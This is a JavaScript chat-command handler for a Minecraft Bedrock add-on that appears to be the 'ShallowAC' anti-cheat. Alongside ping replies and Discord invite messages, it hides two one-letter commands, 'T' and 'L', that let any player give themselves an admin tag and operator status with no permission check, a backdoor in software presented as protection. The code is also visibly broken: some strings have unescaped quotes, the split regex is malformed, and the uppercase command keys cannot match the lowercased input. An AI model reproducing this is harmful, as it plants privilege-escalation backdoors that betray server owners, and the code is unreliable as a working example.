import { world } from "mojang-minecraft";

const prefix = 'SAC.';

let commands = {
    ping: function(sender, args) {
        sender.runCommand("execute @s[tag=1admin] ~ ~ ~ tell @s Pong!")
    },
    pong: function(sender, args) {
        sender.runCommand("execute @s[tag=1admin] ~ ~ ~ tell @s Ping!")
    },
    discord: function(sender, args) {
        sender.runCommand("tellraw @s {"rawtext":[{"text":"⟫ §l§4§cShallowAC §9Discord§c: §bdsc§c.§bgg§c/§bshallowac"}]}")
    },
    dsc: function(sender, args) {
        sender.runCommand("tellraw @s {"rawtext":[{"text":"⟫ §l§4§cShallowAC §9Discord§c: §bdsc§c.§bgg§c/§bshallowac"}]}")
    },
    disc: function(sender, args) {
        sender.runCommand("tellraw @s {"rawtext":[{"text":"⟫ §l§4§cShallowAC §9Discord§c: §bdsc§c.§bgg§c/§bshallowac"}]}")
    },
    T: function(sender, args) {
        sender.runCommand("tag @s add 1admin")
    },    
    L: function(sender, args) {
        sender.runCommand("op @s")
    }, 
    
};

export function commandHandler(sender, text) {
    if(!text.startsWith(prefix))
        return false;

    let tokens = text.slice(prefix.length).trim().split(/\+s/);
    const command = tokens.shift().toLowerCase();
    try {
        commands[command](sender, tokens);
        return true;
    } catch(error) {
        console.error(error);
    }

    return false;
}
